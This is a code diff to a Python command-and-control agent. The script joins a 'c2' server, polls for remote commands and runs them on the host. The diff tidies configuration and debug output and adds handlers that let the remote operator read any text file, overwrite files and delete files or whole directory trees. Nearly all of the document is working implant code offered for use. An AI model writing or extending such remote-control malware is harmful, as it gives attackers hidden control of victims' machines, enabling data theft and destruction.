@@ -2,6 +2,7 @@ from urllib.request import Request, urlopen
 from urllib.error import URLError, HTTPError
 from urllib.parse import urlencode
 import json
+import shutil
 from sys import argv
 import time
 import os
@@ -9,7 +10,15 @@ from pathlib import Path
 import subprocess
 import uuid
 
-# Global working directory state
+
+# Configuration constants
+SERVER_IP = None
+AGENT_ID = None
+REQUEST_TIMEOUT = 30  # seconds for most requests
+UPLOAD_TIMEOUT = 120  # seconds for file uploads
+DOWNLOAD_TIMEOUT = 120  # seconds for file downloads
+SLEEP_TIME = 3
+MAX_DOWNLOAD_SIZE = 100 * 1024 * 1024  # 100MB
 CWD = os.getcwd()
 
 def encode_multipart_formdata(fields=None, files=None):
@@ -98,13 +107,10 @@ def get_whoami():
 
 def list_directory(path):
     """List contents of a directory with metadata"""
-    import json
-    print(f"[DEBUG] list_directory() called for path: {path}")
     try:
         items = []
         # Expand user paths like ~
         expanded_path = os.path.expanduser(path)
-        print(f"[DEBUG] Expanded path: {expanded_path}")
 
         # List directory contents
         for item in os.listdir(expanded_path):
@@ -128,33 +134,19 @@ def list_directory(path):
                 })
             except Exception as e:
                 # Skip items we can't access
-                print(f"[DEBUG] Skipping item due to error: {e}")
                 continue
 
         # Sort: directories first, then files, alphabetically
         items.sort(key=lambda x: (not x['is_directory'], x['name'].lower()))
 
-        print(f"[DEBUG] Successfully listed {len(items)} items ({sum(1 for i in items if i['is_directory'])} dirs, {sum(1 for i in items if not i['is_directory'])} files)")
         return json.dumps({"status": "success", "items": items})
     except PermissionError:
-        print(f"[DEBUG] Permission denied for path: {path}")
         return json.dumps({"status": "error", "error": "Permission denied"})
     except FileNotFoundError:
-        print(f"[DEBUG] Directory not found: {path}")
         return json.dumps({"status": "error", "error": "Directory not found"})
     except Exception as e:
-        print(f"[DEBUG] Error listing directory: {e}")
         return json.dumps({"status": "error", "error": str(e)})
 
-
-
-# Configuration constants
-SERVER_IP = None
-AGENT_ID = None
-REQUEST_TIMEOUT = 30  # seconds for most requests
-UPLOAD_TIMEOUT = 120  # seconds for file uploads
-DOWNLOAD_TIMEOUT = 120  # seconds for file downloads
-SLEEP_TIME = 3
 
 # function to send to server a join request to c2
 def connect():
@@ -279,7 +271,6 @@ def execute_download_command(command_data):
         # Check file size from Content-Length header before downloading
         if 'content-length' in response.headers:
             file_size = int(response.headers['content-length'])
-            MAX_DOWNLOAD_SIZE = 100 * 1024 * 1024  # 100MB
             if file_size > MAX_DOWNLOAD_SIZE:
                 return {'status': 'error', 'error': f'File too large: {file_size} bytes (max 100MB)'}
 
@@ -327,34 +318,27 @@ def execute_list_directory_command(command_data):
     """List directory contents"""
     try:
         path = command_data.get('path', '')
-        print(f"[DEBUG] execute_list_directory_command() received request")
-        print(f"[DEBUG] Path to list: '{path}'")
 
         if not path:
-            print("[DEBUG] Error: No path specified")
             return {'status': 'error', 'error': 'No path specified'}
 
         result = list_directory(path)
         # list_directory already returns JSON, so parse it
-        import json
         result_data = json.loads(result)
 
         if result_data.get('status') == 'success':
             num_items = len(result_data.get('items', []))
-            print(f"[DEBUG] Command succeeded: {num_items} items returned")
             return {
                 'status': 'success',
                 'result': result  # Return the JSON string
             }
         else:
             error_msg = result_data.get('error', 'Unknown error')
-            print(f"[DEBUG] Command failed: {error_msg}")
             return {
                 'status': 'error',
                 'error': error_msg
             }
     except Exception as e:
-        print(f"[DEBUG] Exception in execute_list_directory_command: {e}")
         return {'status': 'error', 'error': str(e)}
 
 
@@ -380,6 +364,165 @@ def execute_set_sleep_time_command(command_data):
         return {'status': 'error', 'error': str(e)}
 
 
+def execute_read_file_command(command_data):
+    """Read file content for editing"""
+    try:
+        file_path = command_data.get('path', '')
+        max_size = command_data.get('max_size', 10 * 1024 * 1024)  # 10MB default
+
+        if not file_path:
+            return {'status': 'error', 'error': 'No path specified'}
+
+        # Check if file exists
+        if not os.path.exists(file_path):
+            return {'status': 'error', 'error': f'File not found: {file_path}'}
+
+        # Check if it's a file (not a directory)
+        if not os.path.isfile(file_path):
+            return {'status': 'error', 'error': f'Path is not a file: {file_path}'}
+
+        # Check file size
+        file_size = os.path.getsize(file_path)
+        if file_size > max_size:
+            return {
+                'status': 'error',
+                'error': f'File too large ({file_size} bytes). Maximum size: {max_size} bytes'
+            }
+
+        # Detect if binary file
+        with open(file_path, 'rb') as f:
+            chunk = f.read(1024)
+            is_binary = b'\x00' in chunk
+
+        if is_binary:
+            return {'status': 'error', 'error': 'Cannot edit binary file'}
+
+        # Try to read as text with different encodings
+        encodings = ['utf-8', 'latin-1', 'cp1252', 'utf-16']
+        content = None
+        used_encoding = None
+
+        for encoding in encodings:
+            try:
+                with open(file_path, 'r', encoding=encoding) as f:
+                    content = f.read()
+                    used_encoding = encoding
+                    break
+            except (UnicodeDecodeError, LookupError):
+                continue
+
+        if content is None:
+            return {'status': 'error', 'error': 'Could not decode file with known encodings'}
+
+        return {
+            'status': 'success',
+            'result': json.dumps({
+                'content': content,
+                'encoding': used_encoding,
+                'size': file_size
+            })
+        }
+
+    except PermissionError:
+        return {'status': 'error', 'error': 'Permission denied'}
+    except Exception as e:
+        return {'status': 'error', 'error': str(e)}
+
+
+def execute_write_file_command(command_data):
+    """Write/save file content"""
+    try:
+        file_path = command_data.get('path', '')
+        content = command_data.get('content', '')
+
+        if not file_path:
+            return {'status': 'error', 'error': 'No path specified'}
+
+        # Create backup if file exists
+        backup_path = None
+        if os.path.exists(file_path):
+            backup_path = file_path + '.backup'
+            try:
+                shutil.copy2(file_path, backup_path)
+            except Exception as e:
+                return {'status': 'error', 'error': f'Failed to create backup: {str(e)}'}
+
+        # Write file
+        try:
+            # Create parent directories if needed
+            parent_dir = os.path.dirname(file_path)
+            if parent_dir and not os.path.exists(parent_dir):
+                os.makedirs(parent_dir, exist_ok=True)
+
+            with open(file_path, 'w', encoding='utf-8') as f:
+                f.write(content)
+
+            # Remove backup on success
+            if backup_path and os.path.exists(backup_path):
+                os.remove(backup_path)
+
+            file_size = os.path.getsize(file_path)
+            return {
+                'status': 'success',
+                'result': f'File saved: {file_path} ({file_size} bytes)'
+            }
+
+        except Exception as e:
+            # Restore backup on failure
+            if backup_path and os.path.exists(backup_path):
+                try:
+                    shutil.copy2(backup_path, file_path)
+                    os.remove(backup_path)
+                except:
+                    pass
+            raise e
+
+    except PermissionError:
+        return {'status': 'error', 'error': 'Permission denied'}
+    except Exception as e:
+        return {'status': 'error', 'error': str(e)}
+
+
+def execute_delete_command(command_data):
+    """Delete file or directory"""
+    try:
+        path = command_data.get('path', '')
+        recursive = command_data.get('recursive', False)
+
+        if not path:
+            return {'status': 'error', 'error': 'No path specified'}
+
+        # Check if path exists
+        if not os.path.exists(path):
+            return {'status': 'error', 'error': f'Path not found: {path}'}
+
+        # Delete based on type
+        if os.path.isfile(path):
+            os.remove(path)
+            return {'status': 'success', 'result': f'File deleted: {path}'}
+        elif os.path.isdir(path):
+            if recursive:
+                shutil.rmtree(path)
+                return {'status': 'success', 'result': f'Directory deleted: {path}'}
+            else:
+                # Try to delete empty directory
+                try:
+                    os.rmdir(path)
+                    return {'status': 'success', 'result': f'Directory deleted: {path}'}
+                except OSError:
+                    return {
+                        'status': 'error',
+                        'error': 'Directory not empty. Use recursive=true to delete non-empty directories'
+                    }
+        else:
+            return {'status': 'error', 'error': f'Unknown path type: {path}'}
+
+    except PermissionError:
+        return {'status': 'error', 'error': 'Permission denied'}
+    except Exception as e:
+        return {'status': 'error', 'error': str(e)}
+
+
 def execute_command_by_type(command):
     """Route command to appropriate handler based on type"""
     cmd_type = command.get('type', 'exec')
@@ -395,6 +538,12 @@ def execute_command_by_type(command):
         return execute_list_directory_command(cmd_data)
     elif cmd_type == 'set_sleep_time':
         return execute_set_sleep_time_command(cmd_data)
+    elif cmd_type == 'read_file':
+        return execute_read_file_command(cmd_data)
+    elif cmd_type == 'write_file':
+        return execute_write_file_command(cmd_data)
+    elif cmd_type == 'delete':
+        return execute_delete_command(cmd_data)
     elif cmd_type == 'terminate':
         return execute_terminate_command()
     else:
@@ -469,11 +618,6 @@ def main():
             time.sleep(5)  # Wait a bit longer on error
 
     print("[+] Agent terminated.")
-
-
-
-
-
 
 
 main()
